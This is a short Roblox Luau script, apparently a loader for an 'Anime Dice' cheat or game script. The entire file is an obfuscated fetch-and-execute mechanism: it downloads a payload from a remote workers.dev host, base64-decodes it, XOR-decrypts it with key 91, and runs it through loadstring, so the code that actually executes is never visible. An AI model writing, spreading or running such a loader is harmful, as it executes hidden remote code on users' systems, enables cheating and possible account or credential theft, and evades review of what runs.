local URL = "https://anime-dice-worker.xinneflex.workers.dev/"

local ok, payload = pcall(function()
    return game:HttpGet(URL)
end)

if not ok then
    warn("Anime Dice: failed to download payload")
    return
end

local b64chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"

local function base64decode(data)
    data = data:gsub("[^" .. b64chars .. "=]", "")

    return (data:gsub(".", function(x)
        if x == "=" then
            return ""
        end

        local r = ""
        local f = b64chars:find(x, 1, true) - 1

        for i = 6, 1, -1 do
            r = r .. (f % 2^i - f % 2^(i-1) > 0 and "1" or "0")
        end

        return r
    end):gsub("%d%d%d?%d?%d?%d?%d?%d?", function(x)
        if #x ~= 8 then
            return ""
        end

        local c = 0

        for i = 1, 8 do
            c += x:sub(i, i) == "1" and 2^(8-i) or 0
        end

        return string.char(c)
    end))
end

local encoded = base64decode(payload)
local code = {}

for i = 1, #encoded do
    code[i] = string.char(bit32.bxor(encoded:byte(i), 91))
end

local source = table.concat(code)

local fn, err = loadstring(source)

if not fn then
    warn("Anime Dice: failed to compile payload")
    warn(err)
    return
end

local success, runtimeError = pcall(fn)

if not success then
    warn("Anime Dice: runtime error")
    warn(runtimeError)
end
